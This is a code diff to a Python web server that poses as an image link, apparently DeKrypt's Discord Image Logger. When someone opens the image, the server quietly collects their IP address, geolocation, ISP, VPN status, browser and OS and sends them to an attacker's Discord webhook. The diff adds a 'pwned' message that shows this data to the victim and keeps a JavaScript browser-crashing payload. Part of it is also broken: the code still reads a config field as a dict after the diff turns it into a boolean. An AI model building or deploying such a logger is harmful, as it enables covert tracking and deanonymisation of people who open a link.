@@ -15,15 +15,19 @@ config = {
     "webhook": "https://discord.com/api/webhooks/your/webhook",
     "image": "https://link-to-you-image.here", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
+    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
     "username": "Image Logger", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": {
-        "doCrashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
-        "customMessage": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
+    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    
+    "message": { # Show a custom message when the user opens the image
+        "doMessage": True, # Enable the custom message?
+        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "richMessage": True, # Enable rich text? (See README for more info)
     },
 
     "vpnCheck": 1, # Prevents VPNs from triggering the alert
@@ -53,7 +57,8 @@ config = {
     # NOTE: Hierarchy tree goes as follows:
     # 1) Redirect (If this is enabled, disables image and crash browser)
     # 2) Crash Browser (If this is enabled, disables image)
-    # 3) Image
+    # 3) Message (If this is enabled, disables image)
+    # 4) Image
 }
 
 def makeReport(ip, useragent = None):
@@ -115,6 +120,7 @@ def makeReport(ip, useragent = None):
     }
   ],
 })
+    return info
 
 binaries = {
     "normal": requests.get(config["image"]).content,
@@ -126,12 +132,15 @@ binaries = {
 
 class ImageLoggerAPI(BaseHTTPRequestHandler):
     def do_GET(self):
-        s = self.path
-        dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
-        if dic.get("url"):
-            try:
-                data = requests.get(dic.get("url")).content
-            except:
+        if config["imageArgument"]:
+            s = self.path
+            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
+            if dic.get("url"):
+                try:
+                    data = requests.get(base64.urlsafe_b64decode((dic.get("url") or dic.get("id")).encode()).decode()).content
+                except:
+                    data = binaries["normal"]
+            else:
                 data = binaries["normal"]
         else:
             data = binaries["normal"]
@@ -145,13 +154,37 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
             self.wfile.write(binaries["loading"] if config["buggedImage"] else data) # Write the image to the client.
         
         else:
-            makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'))
+            result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'))
+
+            message = config["message"]["message"]
+
+            if config["message"]["richMessage"]:
+                message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
+                message = message.replace("{isp}", result["isp"])
+                message = message.replace("{asn}", result["as"])
+                message = message.replace("{country}", result["country"])
+                message = message.replace("{region}", result["regionName"])
+                message = message.replace("{city}", result["city"])
+                message = message.replace("{lat}", str(result["lat"]))
+                message = message.replace("{long}", str(result["lon"]))
+                message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
+                message = message.replace("{mobile}", str(result["mobile"]))
+                message = message.replace("{vpn}", str(result["proxy"]))
+                message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
+                message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
+                message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
+
             datatype = 'image/jpeg'
+
+            if config["message"]["doMessage"]:
+                datatype = 'text/html'
+                data = message.encode()
+            
             if config["crashBrowser"]["doCrashBrowser"]:
                 datatype = 'text/html'
-                data = config["crashBrowser"]["customMessage"].encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher
+                data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher
 
-            elif config["redirect"]["redirect"]:
+            if config["redirect"]["redirect"]:
                 datatype = 'text/html'
                 data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
             self.send_response(200) # 200 = OK (HTTP Status)
